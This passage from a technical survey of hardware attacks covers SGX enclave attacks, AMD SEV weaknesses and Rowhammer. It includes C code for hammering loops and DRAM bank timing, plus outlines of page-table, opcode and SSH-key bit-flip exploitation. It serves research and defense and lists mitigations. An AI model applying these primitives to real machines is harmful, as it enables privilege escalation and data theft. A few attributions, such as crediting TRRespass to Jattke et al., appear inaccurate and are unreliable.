**Mitigation.** Microcode and BIOS updates lock the voltage-control MSRs (MSR 0x150) when SGX enclaves are loaded, preventing runtime voltage changes. The BIOS setting "Overclocking Lock" is enforced. This effectively prevents Plundervolt but also disables overclocking on SGX-enabled platforms.

#### 1.4.7 SGAxe

SGAxe (2020) combines an L1TF-style cache attack with the specific target of Intel's Quoting Enclave (QE) — the architectural enclave responsible for signing attestation quotes. The attack proceeds in two stages:

1. **Extract the QE's attestation key.** Using a CacheOut-style attack (a variant of L1TF/MDS that bypasses the L1D flush mitigation by exploiting cache-line eviction ordering), the attacker forces the QE to load its sealing key into L1D, then extracts it before the L1D flush occurs. This requires precise timing (achievable via SGX-Step) to interrupt the QE between the key load and the L1D flush.

2. **Forge attestation quotes.** With the QE's attestation key, the attacker can sign arbitrary attestation quotes, making any enclave (including a malicious one) appear genuine to remote verifiers. This completely undermines SGX attestation: a relying party can no longer distinguish a genuine enclave from a forgery.

**Impact.** SGAxe breaks the root of trust for the entire SGX ecosystem on affected platforms. Any secret provisioned to an "attested" enclave may actually be delivered to an attacker-controlled enclave running forged attestation.

**Mitigation.** Intel's TCB recovery process: a microcode update changes the platform's TCB version (CPUSVN), which invalidates all previously-provisioned attestation keys. The QE generates a new key, and remote verifiers reject quotes signed with the old TCB version. This is an ongoing arms race: each new microcode update that addresses an attestation-key-threatening vulnerability triggers a TCB recovery, requiring all enclaves to be reprovisioned.

**Operational impact of TCB recovery.** Each TCB recovery requires: (1) applying the new microcode to every SGX platform, (2) generating new attestation keys on each platform (automated but requires enclave restart), (3) updating all remote verifiers' TCB Info collateral (to accept the new TCB version and reject the old one), and (4) reprovisioning any secrets that were sealed with the old sealing key (since the sealing key changes with the TCB version). For large-scale SGX deployments (e.g., a data-center-wide confidential database service), TCB recovery is an operational event comparable to a certificate rotation across the entire fleet. Intel has performed approximately 10 TCB recoveries since SGX's launch, each triggered by a vulnerability disclosure (L1TF, MDS, TAA, CacheOut, PLATYPUS, SGAxe, ÆPIC Leak, Downfall, and microcode-specific fixes).

#### 1.4.8 ÆPIC Leak (CVE-2022-21233)

**Mechanism.** On 10th, 11th, and 12th generation Intel Core processors (Ice Lake, Rocket Lake, Alder Lake), reading from APIC MMIO registers (the local APIC memory-mapped I/O region at physical address 0xFEE00000) returns stale data from the L2 cache rather than actual APIC register values. This is a purely architectural bug — not a speculative or transient execution issue — meaning it cannot be mitigated by speculation barriers.

The stale L2 data may include cache lines recently evicted from an SGX enclave. Because the APIC MMIO read is a legitimate architecturally-committed instruction (not speculative), the leaked data is directly readable without any side-channel decoding step. This makes ÆPIC Leak more reliable and faster than speculative attacks.

**Exploitation.** The attacker (with ring-0 access) maps the APIC MMIO region, triggers enclave execution (causing enclave data to flow through L2), then reads APIC registers. The returned values contain fragments of enclave memory. The attacker repeats this to accumulate enclave data. The attack leaks data from the L2 cache, so it affects any enclave data that passes through L2 (which is most data, since L1 evictions go to L2).

**Affected CPUs.** Intel 10th-gen (Ice Lake) client and server, 11th-gen (Rocket Lake), 12th-gen (Alder Lake) — specifically, CPUs with the new APIC architecture that introduced the bug. Earlier and later generations are not affected.

**Exploitation rate.** ÆPIC Leak extracts enclave data at approximately 334 bytes per second with 100% reliability — no probabilistic decoding or statistical analysis is required. Each APIC MMIO read returns 4 bytes of stale L2 data deterministically. The leaked data includes enclave code pages, data pages, and sealing-key material. The deterministic nature of the leak (architecturally committed reads, not speculative traces) makes it more dangerous than probabilistic side channels for targeted extraction of specific secrets.

**Mitigation.** Microcode update that fixes the APIC MMIO read behavior, ensuring it returns actual register contents rather than stale cache data. The fix was included in Intel's November 2022 platform update (IPU 2022.3). No software-only workaround is possible because the bug is in the APIC hardware's data path, not in the speculative execution model.

#### 1.4.9 CacheOut / L1D Eviction Sampling (CVE-2020-0549)

**Mechanism.** CacheOut is a refinement of the L1TF/MDS class that bypasses the L1D flush mitigation. The key insight: the L1D flush (deployed as the primary L1TF mitigation) occurs on enclave exit. However, during enclave execution, data resides in L1D. If the attacker can cause a specific enclave cache line to be evicted from L1D during execution (before the flush occurs), the evicted data traverses the line-fill buffer (LFB) on its way to L2. At this point, it becomes accessible via MDS-style LFB sampling.

The attack uses a hyper-thread sibling to evict specific L1D lines (by accessing conflicting addresses in the same L1D set) while the enclave is running on the other hyper-thread. The evicted enclave data passes through the LFB, where the attacker's MDS-style faulting load samples it. This bypasses the L1D flush because the data is captured during execution (while still in the LFB transit), not after the flush.

**Exploitation.** CacheOut demonstrated extraction of SGX enclave data, kernel data, and cross-VM data. The attacker achieves targeted extraction (choosing which cache line to evict, and thus which data to leak) rather than random sampling.

**Mitigation.** The complete mitigation requires both L1D flush on enclave exit (for L1TF) and `VERW`-based buffer clearing (for MDS). Additionally, disabling SMT eliminates the hyper-thread-based eviction trigger. On CPUs with hardware MDS fixes (10th gen and later), the LFB sampling is blocked at the hardware level, making CacheOut ineffective regardless of L1D flush timing.

CacheOut illustrates a recurring theme in hardware-vulnerability research: mitigations for one vulnerability (L1D flush for L1TF) can be bypassed by combining the attack with a different vulnerability class (MDS-style buffer sampling). Each new mitigation must be analyzed not only in isolation but in combination with all known attack techniques. The defense surface grows combinatorially, while the attacker needs to find only one viable combination. This asymmetry is a fundamental challenge in hardware security — unlike software patches, which can close a vulnerability completely, hardware mitigations often reduce the attack surface without eliminating it, leaving residual exposure that researchers systematically exploit.

### 1.5 SGX defense mechanisms and current status

**Sealing.** Enclaves can encrypt data for persistent storage using a sealing key derived from either MRENCLAVE (enclave identity — only the exact same enclave binary can unseal) or MRSIGNER (signer identity — any enclave signed by the same key can unseal). The sealing key is derived via `EGETKEY` and is bound to the platform's TCB version, so a TCB recovery (microcode update) changes the sealing key, requiring a migration path for sealed data.

**Monotonic counters.** SGX provides platform-bound monotonic counters (via the Platform Service Enclave) intended to prevent rollback attacks on sealed data. However, these counters are limited in quantity and rate (approximately 256 counters per platform, with write rates limited to prevent NVRAM wear), and their reliability has been questioned (the PSE is deprecated on newer platforms). Without reliable monotonic counters, enclave developers must implement rollback protection externally — typically by storing the latest state version on a trusted remote server and checking it on each enclave restart. This transforms a local-only enclave into a networked service, increasing the attack surface and adding a network availability dependency.

**SGX-Step as a security analysis tool.** While SGX-Step is presented as an attack tool in §1.4.1, it is also invaluable for defensive analysis. Enclave developers use SGX-Step to audit their own enclaves for side-channel leakage: by single-stepping the enclave and observing which pages and cache lines are accessed for each instruction, the developer can verify that the memory-access pattern is data-independent. This defensive use is analogous to using a debugger to verify constant-time behavior — SGX-Step provides the ground truth for what an OS-level attacker would observe.

**SGX deprecation on client CPUs.** Starting with 12th generation (Alder Lake) client processors, Intel removed SGX support from consumer/client CPUs. SGX remains available only on Xeon server processors (Ice Lake Xeon, Sapphire Rapids, and later). The deprecation reflects both the difficulty of defending the client SGX threat model (where the OS is assumed malicious) and Intel's strategic focus on server-side confidential computing (using TDX — Trust Domain Extensions — as the successor technology for VM-level isolation).

**Practical SGX hardening checklist.** For deployments that still use SGX (server enclaves for key management, confidential databases, secure enclaves for MPC):

1. Ensure latest microcode is applied (addresses L1TF, MDS, TAA, ÆPIC, CacheOut).
2. Disable hyper-threading on SGX-hosting cores (eliminates hyper-thread-based side channels).
3. Use constant-time cryptographic implementations inside enclaves (eliminates cache-timing and branch-timing side channels).
4. Implement ORAM or oblivious data access for sensitive data structures (eliminates page-fault and cache-access-pattern side channels).
5. Validate DCAP TCB level in attestation verification (reject platforms with outdated microcode).
6. Lock voltage-control MSRs via BIOS (prevents Plundervolt).
7. Monitor for abnormal APIC timer interrupt rates (detects SGX-Step single-stepping attempts).
8. Use SGX2 `EACCEPT`-based validation for all dynamically-added pages.
9. Zero all registers before EEXIT (prevents register-value leakage to untrusted code).
10. Implement replay protection via monotonic counters or external trusted timestamping (prevents sealed-data rollback).

### 1.6 AMD SEV/SEV-ES/SEV-SNP comparison

AMD's Secure Encrypted Virtualization (SEV) provides confidential computing at the VM level rather than the enclave level. The architecture differs fundamentally from SGX.

**SEV (first generation).** Each VM is assigned a unique AES encryption key (managed by the AMD Secure Processor, an ARM Cortex-A5 embedded in the AMD CPU). The memory controller encrypts/decrypts VM memory on the fly using AES-128 in ECB mode (initial versions) or AES-128-XEX/XTS (later revisions). The hypervisor cannot read VM memory in plaintext. However, SEV does not protect register state (the hypervisor can read VMCB — VM Control Block — fields on VMEXIT), and the ECB/XEX mode is vulnerable to ciphertext manipulation (the hypervisor can reorder, replay, or swap encrypted pages).

**SEV-ES (Encrypted State).** Extends SEV with register-state encryption. On VMEXIT, the guest's register state is encrypted and stored in a Guest-Hypervisor Communication Block (GHCB) with only explicitly-shared fields visible to the hypervisor. This prevents the hypervisor from reading or modifying the guest's registers on exits.

**SEV-SNP (Secure Nested Paging).** Adds integrity protection via the Reverse Map Table (RMP). The RMP is a hardware-enforced table that records which VM owns each physical page, preventing the hypervisor from remapping, replaying, or corrupting guest memory. SEV-SNP also provides attestation (via the AMD Secure Processor), a TCB versioning model, and migration agents for live VM migration.

**Known attacks on AMD SEV.**

- **SEVered (2018).** Exploits the lack of integrity protection in SEV (pre-SNP): the hypervisor remaps encrypted guest pages (swapping the mapping so that a guest virtual address points to a different encrypted physical page), observing which pages the guest accesses and using the guest's own I/O operations to exfiltrate decrypted data. Mitigated by SEV-SNP's RMP integrity protection.

- **Ciphertext side channels.** The hypervisor can observe ciphertext changes in guest memory (since it has read access to the encrypted DRAM). By monitoring which cache lines change between guest executions, the attacker infers the guest's memory-access patterns without needing to decrypt the data. This is analogous to the controlled-channel attack on SGX but operates on ciphertext-change patterns rather than page faults.

- **Voltage-glitching attacks on SEV-SNP.** Research has demonstrated that undervolting the CPU (similar to Plundervolt) can corrupt SEV-SNP computations, though the practical exploitability is more limited than Plundervolt on SGX due to the VM-level (rather than enclave-level) granularity.

- **undeSErVed (2023).** Demonstrated that a malicious hypervisor can use voltage glitching (via the AMD SMU — System Management Unit) to corrupt computations inside SEV-SNP VMs. The SMU provides voltage-frequency scaling interfaces that, on some platforms, are accessible to the hypervisor without hardware restrictions. By undervolting during a guest VM's AES-NI computation (used for dm-crypt disk encryption), the attacker induces faulty ciphertexts that reveal the disk-encryption key via DFA. AMD's response was to add SMU access restrictions in newer firmware versions, similar to Intel's MSR locking for Plundervolt.

- **SEV-ES register interception.** In the SEV-ES model, the hypervisor can selectively request access to specific guest register values via the GHCB protocol. If the guest firmware (OVMF/SEV-aware BIOS) is not correctly configured to refuse unnecessary register sharing, the hypervisor can read guest register values on VMEXIT, undermining the encrypted-state protection. This is a configuration vulnerability rather than a hardware flaw, but it affects many production SEV-ES deployments that use default OVMF configurations.

**Architectural comparison summary.** SGX provides process-level (enclave) isolation with a small TCB (CPU hardware only), while SEV provides VM-level isolation with a larger TCB (AMD Secure Processor + CPU). SGX has a richer side-channel attack surface (because the OS is untrusted), while SEV-SNP's threat model trusts the guest OS but not the hypervisor. Intel's successor to SGX for VM-level confidential computing is TDX (Trust Domain Extensions), which is architecturally more similar to SEV-SNP than to SGX.

**Comparison table:**

| Feature | Intel SGX | AMD SEV-SNP | Intel TDX |
|---------|-----------|-------------|-----------|
| Isolation granularity | Process (enclave) | VM | VM (Trust Domain) |
| Memory encryption | MEE (AES-CTR + Merkle tree) | AES-XTS (per-VM key) | AES-XTS (per-TD key) + integrity |
| Integrity protection | Merkle tree (MEE) | RMP (page ownership) | Integrity Directory (TD) |
| Attestation model | EPID / DCAP | AMD SEV firmware | Intel TDX Module + DCAP |
| Threat model excludes | OS, hypervisor, SMM | Hypervisor, platform firmware | Hypervisor (partial trust) |
| Side-channel exposure | High (OS controls scheduling, pages) | Moderate (hypervisor sees ciphertext changes) | Moderate (similar to SEV-SNP) |
| Max protected memory | 512 MB (EPC) | Full VM memory | Full TD memory |
| Status (2025) | Deprecated on client; server Xeon only | GA on EPYC 7003/9004 | GA on Sapphire Rapids+ |

The confidential-computing landscape is converging on VM-level isolation (SEV-SNP, TDX) as the primary deployment model. SGX's process-level model proved too difficult to defend against the OS-as-attacker threat model — the combined weight of controlled-channel, MDS, L1TF, Plundervolt, SGAxe, and ÆPIC Leak attacks eroded confidence in SGX's security guarantees despite each individual vulnerability being patched. The VM-level model reduces the attack surface by trusting the guest OS (only the hypervisor is untrusted), eliminating the controlled-channel and most scheduling-based attacks.

---

## 2. Rowhammer

### 2.1 DRAM architecture deep dive

Understanding Rowhammer requires detailed knowledge of DRAM organization and timing.

**Physical hierarchy.** A modern DRAM system is organized as: **channels** (independent 64-bit memory buses, typically 1-4 per CPU), **DIMMs** (physical memory modules on each channel), **ranks** (groups of DRAM chips that operate in lockstep on a DIMM, typically 1-2 ranks per DIMM), **banks** (independent memory arrays within each rank, 8-16 banks per rank in DDR4, 16-32 bank groups in DDR5), **rows** (the fundamental storage unit, typically 8K-64K rows per bank), and **columns** (bytes within a row, typically 1-8 KB per row, yielding row sizes of 8-64 KB).

**Row buffer and sense amplifiers.** Each bank has a single row buffer (an array of sense amplifiers). The row buffer holds one entire row of data (e.g., 8 KB). To read a cell, the memory controller issues an ACTIVATE command that opens (reads) the entire row into the row buffer, destroying the charge in the row's capacitors. The requested column is then read from the row buffer (CAS — Column Address Strobe). After the access, the row is either left open (for potential subsequent accesses to the same row — a "row buffer hit") or precharged (PRECHARGE command — the row buffer writes back the data to the capacitors, restoring the charge, and the bank is ready for a different row to be activated).

**Critical timing parameters:**

- **tRAS (Row Active Time):** Minimum time a row must remain active after ACTIVATE, typically 32-39 ns for DDR4.
- **tRP (Row Precharge Time):** Time required for PRECHARGE to complete before a new ACTIVATE, typically 13-16 ns.
- **tRC (Row Cycle Time):** tRAS + tRP, the minimum time between consecutive ACTIVATEs to the same bank, typically 45-55 ns. This sets the maximum hammering rate: approximately 18-22 million activations per second per bank.
- **tREFI (Refresh Interval):** Time between periodic refresh commands, standardized at 7.8 μs (64 ms total refresh window for all rows, divided by the number of rows). At 64K rows and 64 ms total, each row is refreshed approximately once every 64 ms.
- **tRFC (Refresh Cycle Time):** Time the DRAM is busy during a refresh operation, typically 260-350 ns for DDR4 (longer for higher-density DIMMs). During tRFC, the bank is unavailable.

**The Rowhammer window.** Between two consecutive refreshes of a victim row (64 ms interval), the attacker can issue approximately (64 ms) / (tRC) ≈ 64,000,000 / 50 ≈ 1,280,000 activations to an aggressor row in the same bank. Research has shown that as few as 10,000-50,000 activations (for highly vulnerable cells) or up to several million (for more robust cells) are sufficient to induce bit flips. Newer DRAM generations (higher density, smaller cell sizes) tend to be more vulnerable — DDR4 is generally more vulnerable than DDR3, and initial DDR5 results show continued vulnerability.

**Charge disturbance physics.** The physical mechanism behind Rowhammer is electromagnetic coupling between the wordlines (the horizontal conductors that select a row for activation) and the capacitor cells in adjacent rows. When a wordline is driven high (during ACTIVATE), the voltage transient couples into adjacent wordlines via parasitic capacitance. This parasitic coupling either injects or drains charge from the adjacent row's capacitor cells, depending on the cell's stored value and the coupling polarity. Cells storing a "1" (charged capacitor) are more susceptible to charge drain (1→0 flip) from an adjacent activation than cells storing a "0" are to charge injection (0→1 flip), though both directions are possible. The disturbance per activation is small (millivolts of charge change on the capacitor), but thousands of activations within a refresh interval accumulate the disturbance past the sense-amplifier's threshold, causing a misread on the next access.

**Temperature dependence.** Higher temperatures accelerate charge leakage from DRAM capacitors (the retention time decreases exponentially with temperature). At elevated temperatures (>50°C), the Rowhammer threshold (number of activations needed for a flip) decreases, making the attack easier. Some Rowhammer tools deliberately heat the DRAM (via sustained memory-intensive operations) before the attack phase. Conversely, cooling DRAM (via DIMM coolers or lower ambient temperature) increases the threshold, though it does not eliminate the vulnerability.

**DDR5 considerations.** DDR5 introduces per-bank refresh (each bank can be refreshed independently, doubling the effective refresh rate), same-bank refresh (allowing partial refresh without taking the entire rank offline), and on-die ECC (DRAM-internal single-bit error correction per 128-bit access, transparent to the memory controller). These features provide some Rowhammer resistance, but initial research (2023) has demonstrated that DDR5 modules remain vulnerable — the smaller cell geometries in DDR5 partially offset the improved refresh mechanisms.

### 2.2 Hammering variants with code examples

**Single-sided Rowhammer.** The attacker repeatedly activates one aggressor row. Bit flips occur in the two physically adjacent rows (the victim rows above and below the aggressor). The attacker needs only one accessible row near the target victim.

```c
// Single-sided Rowhammer: repeatedly read from aggressor row
// Requires addresses in the same bank, different rows
// addr_aggressor must be in a row adjacent to the victim

void hammer_single(volatile char *addr_aggressor, int iterations) {
    for (int i = 0; i < iterations; i++) {
        // Read from aggressor row
        *(volatile char *)addr_aggressor;
        // Flush from cache to force DRAM access (row activation)
        asm volatile("clflush (%0)" :: "r" (addr_aggressor));
        // Memory fence to ensure flush completes
        asm volatile("mfence");
    }
}
```

**Double-sided Rowhammer.** The attacker activates two aggressor rows that sandwich the victim row, concentrating disturbance from both sides. This is significantly more effective (lower activation count needed, higher flip rate) but requires controlling addresses on both sides of the victim.

```c
// Double-sided Rowhammer: alternate between two aggressor rows
// addr_a and addr_b are in rows immediately above and below the victim row

void hammer_double(volatile char *addr_a, volatile char *addr_b,
                   int iterations) {
    for (int i = 0; i < iterations; i++) {
        // Activate aggressor row A
        *(volatile char *)addr_a;
        // Activate aggressor row B
        *(volatile char *)addr_b;
        // Flush both from cache
        asm volatile("clflush (%0)" :: "r" (addr_a));
        asm volatile("clflush (%0)" :: "r" (addr_b));
        asm volatile("mfence");
    }
}
```

The double-sided variant typically induces flips in 50-100K activations on DDR4 (per aggressor pair), compared to 200K-5M for single-sided. The `clflush` instruction is essential: without it, the CPU cache absorbs the reads and no DRAM row activation occurs. Each `clflush` + read pair forces an actual ACTIVATE command to the DRAM bank.

**Non-temporal store alternative.** On systems where `clflush` is restricted or monitored, the attacker can use non-temporal stores (`movnti`) followed by an `sfence` to bypass the cache write-back and force the data directly to DRAM. Non-temporal stores always write through to memory (bypassing the cache), and subsequent reads to the same address cause a cache miss and thus a DRAM ACTIVATE. This provides an alternative to `clflush` for triggering row activations:

```c
// Using non-temporal stores as clflush alternative
void hammer_nontemporal(volatile char *addr_a, volatile char *addr_b,
                        int iterations) {
    for (int i = 0; i < iterations; i++) {
        // Non-temporal store (bypasses cache, writes to DRAM)
        _mm_stream_si32((int *)addr_a, 0);
        _mm_stream_si32((int *)addr_b, 0);
        asm volatile("sfence");
        // Subsequent reads will miss in cache, causing ACTIVATE
        *(volatile char *)addr_a;
        *(volatile char *)addr_b;
    }
}
```

**One-location Rowhammer.** This variant exploits the DRAM controller's row-buffer management. By accessing a single address repeatedly (with `clflush` between accesses), the attacker relies on the memory controller's open-page policy: the ACTIVATE for the target row occurs, then the row is precharged (either by the controller's timeout or by a conflicting access from another thread), and the next access triggers another ACTIVATE. The effectiveness depends on the memory controller's scheduling policy and whether other memory traffic causes the necessary precharges.

**Many-sided Rowhammer.** Extending beyond double-sided, the attacker uses N aggressor rows (N≥4) within the same bank, distributed such that the victim row is adjacent to one or more of them. The key advantage is TRR evasion: with many aggressors, each individual aggressor's activation count stays below TRR's detection threshold, while the combined disturbance from all aggressors exceeds the flip threshold on the victim row. This is the core technique behind TRRespass and Blacksmith.

```c
// Many-sided Rowhammer: cycle through N aggressor addresses
// All addresses must be in the same bank, in rows near the victim

void hammer_many_sided(volatile char **addrs, int n_addrs,
                       int iterations) {
    for (int i = 0; i < iterations; i++) {
        for (int j = 0; j < n_addrs; j++) {
            *(volatile char *)addrs[j];
        }
        // Flush all from cache
        for (int j = 0; j < n_addrs; j++) {
            asm volatile("clflush (%0)" :: "r" (addrs[j]));
        }
        asm volatile("mfence");
    }
}
```

### 2.3 DRAM address reverse-engineering

For targeted Rowhammer, the attacker must determine the mapping from CPU physical addresses to DRAM coordinates (channel, rank, bank, row, column). This mapping is CPU-specific, undocumented, and varies across memory controller configurations.

**Timing-based probing (DRAMA, 2016).** Two physical addresses that map to the same bank but different rows exhibit higher access latency (row-buffer conflict) than addresses in different banks (no conflict). The attacker allocates a large memory region, measures pairwise access latencies, and clusters addresses by bank. From the bank groupings and known DRAM geometry, the attacker reconstructs the address-mapping function.

```c
// DRAMA timing-based bank detection
// Measure access time for two addresses; high time = same bank, different row

uint64_t time_pair(volatile char *a, volatile char *b) {
    uint64_t t0, t1;
    asm volatile("clflush (%0)" :: "r" (a));
    asm volatile("clflush (%0)" :: "r" (b));
    asm volatile("mfence");

    asm volatile("rdtscp" : "=a" (t0) :: "rcx", "rdx");
    *(volatile char *)a;
    *(volatile char *)b;
    asm volatile("rdtscp" : "=a" (t1) :: "rcx", "rdx");

    return t1 - t0;
}
// High latency (~300+ cycles) → same bank, row conflict
// Low latency (~200 cycles) → different banks or same row (row buffer hit)
```

**Physical address information.** On Linux, `/proc/PID/pagemap` provides virtual-to-physical address translation. Since Linux 4.0, reading physical frame numbers requires `CAP_SYS_ADMIN`. Transparent Huge Pages (THP) help the attacker: a 2 MB huge page is physically contiguous, so the attacker knows the relative physical offsets of addresses within the huge page without needing `pagemap`.

**Reverse-engineering DRAM addressing functions.** The mapping from physical addresses to DRAM coordinates typically involves XOR-based hash functions on address bits. For example, a common Intel mapping uses XOR of address bits 14, 17, and 20 to determine the bank index. The DRAMA tool automates the reverse-engineering by testing thousands of address pairs, measuring row-buffer conflict timing, and fitting the observed pattern to a parameterized XOR-hash model. The resulting mapping function is then used to select aggressor addresses that target a specific victim row in a specific bank.

The reverse-engineering must be repeated for each CPU model and memory configuration (number of channels, ranks, and banks), as the mapping function changes. Research groups have published known mappings for common Intel platforms (Haswell, Skylake, Coffee Lake, Ice Lake) and some AMD platforms (Zen, Zen 2), but new platforms require fresh analysis.

### 2.4 TRR and its evasion

**Target Row Refresh (TRR).** TRR is a DRAM-internal mitigation deployed in DDR4 modules since approximately 2014. The mechanism is proprietary and varies between DRAM vendors (Samsung, SK Hynix, Micron), but the general approach is: the DRAM chip or memory controller tracks frequently-activated rows (aggressor candidates) and proactively refreshes their adjacent rows during periodic refresh cycles or using spare refresh cycles.

TRR implementations have limited tracking capacity — typically 1-16 aggressor rows can be tracked simultaneously. The tracking mechanism is statistically sampled (probabilistic) rather than exhaustive, meaning some aggressors may evade tracking.

The three major DRAM vendors implement TRR differently. Samsung's TRR (marketed as "pTRR" — pseudo-TRR) uses a small counter table in the DRAM die that samples activations and triggers neighbor-row refreshes when a counter exceeds a threshold. SK Hynix uses a similar counter-based approach but with different sampling rates and counter sizes. Micron's implementation (less documented) appears to use a combination of counter tracking and periodic refresh-stealing (borrowing some periodic refresh cycles to refresh high-activity neighbor rows). Reverse-engineering studies (TRRespass, 2020) determined that all three vendors' TRR implementations fail when confronted with many-sided patterns that exceed their counter capacity.

**TRRespass (2020).** Jattke et al. demonstrated systematic TRR bypass by using many-sided hammering patterns. Instead of two aggressor rows (double-sided), TRRespass uses N aggressor rows (N=4 to 20) distributed across multiple rows in the same bank. Each aggressor is activated fewer times individually (below TRR's detection threshold), but the cumulative disturbance on the victim row from all aggressors exceeds the flip threshold. TRRespass tested 42 DDR4 DIMMs from three major vendors and found all were vulnerable when using sufficiently many-sided patterns.

**Half-Double (2021).** Google researchers discovered that bit flips can propagate beyond immediately adjacent rows. Hammering row N can induce flips in row N+2 (two rows away), not just N+1. The mechanism involves coupling between the wordlines: the aggressor's repeated activation disturbs not only the immediately adjacent row but also, through second-order electromagnetic coupling, the row beyond it. This defeats TRR implementations that only refresh the immediately adjacent rows (N-1 and N+1). The Half-Double effect has been demonstrated on all three major DRAM vendors' DDR4 modules.

The Half-Double discovery has profound implications for TRR and PARA-style defenses. If refreshing only the immediately adjacent rows (N-1 and N+1) is insufficient because the disturbance propagates to N+2, then defenses must also refresh rows at distance 2 from each aggressor — doubling the refresh overhead. Google's disclosure estimated that approximately 25% of tested DDR4 DIMMs exhibited Half-Double effects under aggressive hammering conditions. The JEDEC DDR5 standard incorporated awareness of Half-Double by expanding the RFM mechanism to consider rows beyond immediate neighbors, though the implementation details are vendor-specific.

### 2.5 Advanced Rowhammer attacks

**SMASH (Synchronized Many-sided Hammering, 2021).** A browser-based Rowhammer attack that operates without `clflush` (which is not available from JavaScript). SMASH exploits three mechanisms:

1. **Cache eviction.** Instead of `clflush`, SMASH constructs eviction sets (sets of addresses that map to the same cache set) and accesses them to evict the target addresses from the cache, forcing DRAM access.
2. **Transparent Huge Page (THP) exploitation.** JavaScript `ArrayBuffer` allocations that are large enough (>2 MB) trigger THP allocation, providing physically-contiguous memory. The attacker knows the intra-huge-page physical-address offsets, enabling bank/row targeting.
3. **DRAM refresh synchronization.** SMASH synchronizes hammering with DRAM refresh intervals (using JavaScript `performance.now()` timing) to maximize the number of activations within each refresh window.

SMASH demonstrated Rowhammer-induced bit flips from Firefox and Chrome on DDR4 systems with TRR enabled. The attack achieves sufficient activation rates (>100K per refresh interval) to flip bits despite the cache-eviction overhead.

The SMASH attack chain from browser to privilege escalation proceeds as follows: the JavaScript code allocates large ArrayBuffers (triggering THP for physical contiguity), identifies same-bank addresses via timing-based bank detection (using `performance.now()` to measure access latency), constructs eviction sets for cache bypass, and hammers the identified aggressor rows. The resulting bit flip in a PTE grants the browser process access to physical pages belonging to the kernel or other processes, enabling sandbox escape and arbitrary code execution. The entire chain has been demonstrated end-to-end without any browser vulnerability — the only requirement is JavaScript execution.

**Browser Rowhammer mitigations.** Browsers have responded to SMASH and earlier browser-based Rowhammer (Gruss et al., 2016) by: reducing `performance.now()` precision (to 5 μs or lower, making timing-based bank detection harder), isolating `SharedArrayBuffer` behind cross-origin isolation headers (preventing it from being used as a high-precision timer), and limiting the maximum `ArrayBuffer` size (reducing the probability of THP allocation). These mitigations increase the difficulty but do not eliminate browser-based Rowhammer — eviction-based timing and statistical approaches can work around reduced timer precision.

**Blacksmith (2021).** A frequency-based Rowhammer fuzzer that discovers non-uniform access patterns bypassing all known TRR implementations. Blacksmith's key insight: TRR implementations make assumptions about the uniformity of hammering patterns (e.g., all aggressor rows are activated at the same frequency). By varying the activation frequency across aggressor rows (some hammered rapidly, others slowly, in carefully tuned temporal patterns), Blacksmith generates patterns that evade TRR's tracking heuristics.

Blacksmith tested all available DDR4 DIMMs (160+ modules) and found that every single one was vulnerable to at least one non-uniform pattern. The tool is open-source and generates patterns via a combination of random fuzzing and guided optimization.

**Blacksmith's algorithm.** The fuzzer operates in two phases. In the exploration phase, it generates random non-uniform patterns by selecting N aggressor rows (typically 4-20) and assigning each a frequency weight (determining how many times it is activated relative to the others within each hammering iteration). In the exploitation phase, patterns that induce flips are mutated (frequency weights adjusted, aggressor rows added/removed, temporal ordering varied) to find the most effective pattern for the specific DIMM. The key parameters are: the number of aggressors, the relative activation frequencies, the temporal ordering (whether aggressors are accessed in a round-robin, burst, or interleaved pattern), and the synchronization with DRAM refresh (hammering immediately after a refresh provides the maximum window before the next refresh).

The implication of Blacksmith's universal success is that TRR, as implemented in all tested DDR4 DIMMs (2014-2021 manufacture dates, all three major vendors), is fundamentally insufficient. The limited tracking capacity of TRR (estimated 1-16 entries across vendors) cannot handle the combinatorial explosion of possible non-uniform multi-aggressor patterns. This has motivated the DDR5 RFM approach, which uses DRAM-internal counters with higher capacity — but whether RFM withstands Blacksmith-class attacks on DDR5 remains an active research question.

### 2.6 Exploitation primitives

A Rowhammer bit flip is only useful if it corrupts security-critical data. The attacker must massage the physical memory layout to place target data on victim rows.

**Page-table entry (PTE) bit flips.** This is the most studied Rowhammer exploitation primitive. A PTE is a 64-bit structure where individual bits control critical properties:

- Bit 0 (Present): if flipped 0→1, a previously-invalid PTE becomes valid, potentially mapping arbitrary physical memory.
- Bit 1 (Read/Write): if flipped 0→1, a read-only page becomes writable.
- Bit 2 (User/Supervisor): if flipped 0→1, a kernel-only page becomes user-accessible.
- Bit 7 (Page Size): if flipped 0→1, a 4 KB PTE becomes a 2 MB huge-page PTE, mapping a large, potentially misaligned physical region.
- Bits 12-51 (Physical Frame Number): a flip in any of these bits changes the physical page that the virtual address maps to, potentially redirecting a user page to a kernel page or another process's page.

The exploitation flow: (1) the attacker allocates memory pages such that the OS places PTEs on a DRAM row adjacent to attacker-controlled aggressor rows (using memory spraying and page-table exhaustion techniques), (2) the attacker hammers to flip a bit in a PTE, (3) the corrupted PTE now grants unauthorized access (kernel read, write, or execute), (4) the attacker uses the corrupted mapping for privilege escalation.

**Opcode bit flips.** If executable code resides on a victim row, a bit flip can change an instruction's opcode or operand. For example, flipping a bit in a conditional jump (`JZ` → `JNZ`) can invert a security check, or flipping a bit in a `CMP` operand can change the compared value. This is more difficult to exploit reliably because the attacker must control which code page is on the victim row and which specific bit flips. However, the technique has been demonstrated in research: a single-bit flip in the `sudo` binary's authentication path (changing a `JE` to `JNE` in the password-check code) caused `sudo` to grant root access on an incorrect password.

**RSA key bit flips.** In the Flip Feng Shui attack (§2.7), a bit flip in an RSA public key stored in a victim VM's `authorized_keys` file creates a new public key whose corresponding private key can be efficiently computed. Specifically, flipping a single bit in the RSA modulus N produces N' that may have a small prime factor, which the attacker can find via trial division or ECM factoring. The attacker then computes the private key for N', forges an SSH signature, and authenticates to the victim VM. This attack has been demonstrated end-to-end against OpenSSH in a KVM/QEMU environment.

**Memory-massaging techniques.** To place target data on a DRAM row adjacent to attacker-controlled rows, the attacker uses "memory massaging" — a combination of allocation and deallocation patterns that influence the OS's page allocator:

1. **Page-table spraying.** The attacker allocates and maps thousands of pages, causing the kernel to allocate page-table pages. By controlling the allocation pattern (number and order of mappings), the attacker can influence which physical pages are used for page tables, increasing the probability that a PTE page lands on a target DRAM row.
2. **Buddy-allocator exploitation.** The Linux buddy allocator merges and splits free pages in power-of-two blocks. The attacker can fragment the allocator's free lists by allocating and freeing pages in specific patterns, forcing subsequent kernel allocations (for page tables, slabs, or code pages) to land on specific physical pages.
